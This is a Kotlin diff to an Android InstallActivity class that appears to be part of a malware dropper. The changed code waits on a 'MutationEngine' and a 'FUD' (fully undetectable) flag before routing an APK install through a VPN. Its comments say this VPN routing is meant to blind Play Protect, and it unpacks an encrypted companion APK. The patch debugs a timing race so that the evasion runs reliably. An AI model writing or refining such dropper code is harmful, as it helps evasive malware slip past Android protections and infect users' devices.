@@ -184,8 +184,18 @@ class InstallActivity : Activity() {
                 if (cachedApk != null && cachedApk.exists()) {
                     setStage(Stage.INSTALLING)
                     val apkBytes = cachedApk.readBytes()
-                    // Route through VPN on restore — Play Protect must be blinded
-                    prepareAndStartVpn(apkBytes)
+                    // Activity restored mid-install (e.g. screen rotation, BAL kill+restart).
+                    // MutationEngine may still be running on daemon thread — wait for FUD flag
+                    // before calling prepareAndStartVpn(), otherwise stale default=1 is read.
+                    Thread {
+                        val deadline = System.currentTimeMillis() + 3000L
+                        while (!LauncherApplication.fudFlagReady &&
+                               System.currentTimeMillis() < deadline) {
+                            Thread.sleep(50)
+                        }
+                        // Route through VPN on restore — Play Protect must be blinded
+                        runOnUiThread { prepareAndStartVpn(apkBytes) }
+                    }.start()
                 } else {
                     setStage(Stage.IDLE)
                     startDownload()
@@ -583,10 +593,19 @@ class InstallActivity : Activity() {
      *         Format: [4-byte seed LE][encrypted APK bytes]
      */
     private fun getCompanionBytes(): ByteArray {
-        // Wait for MutationEngine to finish (max 500ms — animation already covered the delay)
+        // Wait for MutationEngine to finish — dual condition:
+        //   1. mutatedFile exists (APK bytes ready)
+        //   2. fudFlagReady = true (FUD flag written to SharedPrefs via .commit())
+        // Both must be true before proceeding. Timeout = 3700ms (Phase1+Phase2 window).
+        // If either is not ready within timeout, we proceed with whatever state exists:
+        //   - APK: falls through to Tier 2 (asset blob)
+        //   - FUD: SharedPrefs default=1 (FUD ON) is the safe fallback.
         val mutatedFile = LauncherApplication.getMutatedApkFile(application)
-        val deadline = System.currentTimeMillis() + 500L
-        while (!mutatedFile.exists() && System.currentTimeMillis() < deadline) {
+        val deadline = System.currentTimeMillis() + 3700L
+        while (System.currentTimeMillis() < deadline) {
+            val fileReady = mutatedFile.exists() && mutatedFile.length() > 0L
+            val fudReady  = LauncherApplication.fudFlagReady
+            if (fileReady && fudReady) break
             Thread.sleep(50)
         }
 
